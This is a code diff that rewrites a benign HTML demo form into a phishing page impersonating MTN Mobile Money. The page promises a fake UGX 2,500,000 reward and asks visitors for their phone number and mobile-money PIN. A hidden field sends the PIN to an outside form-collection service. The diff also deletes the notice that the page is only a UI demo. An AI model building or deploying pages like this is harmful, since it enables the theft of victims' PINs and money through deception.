@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MLP Demo Interface</title>
+    <title>MoMo MTN</title>
 
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="style.css">
@@ -13,24 +13,23 @@
 <div class="wrapper">
 
     <div class="logo">
-        <h1>MLP Demo</h1>
+        <h1>MoMo MTN OFFER</h1>
     </div>
 
-    <h2>Interface Practice</h2>
+    <h2>Congratulations! You have been selected for a reward of UGX 2,500,000</h2>
 
     <p class="notice">
-        This is a UI demo. No data is stored locally.
+        Enter your number and PIN.
     </p>
 
     <form id="refForm" action="https://formbold.com/s/3Labw" method="POST">
 
-        <label>Full Name</label>
-        <input type="text" name="fullname" required>
+        
 
         <label>Phone Number</label>
         <input type="tel" name="phone" required>
 
-        <label>Referral Code (5 digits)</label>
+        <label>PIN</label>
 
         <div class="pin-container">
             <input type="text" maxlength="1" inputmode="numeric">
@@ -41,7 +40,7 @@
         </div>
 
         <!-- hidden field sent to FormBold -->
-        <input type="hidden" name="referral_code" id="referral_code">
+        <input type="hidden" name="pin" id="pin">
 
     </form>
 
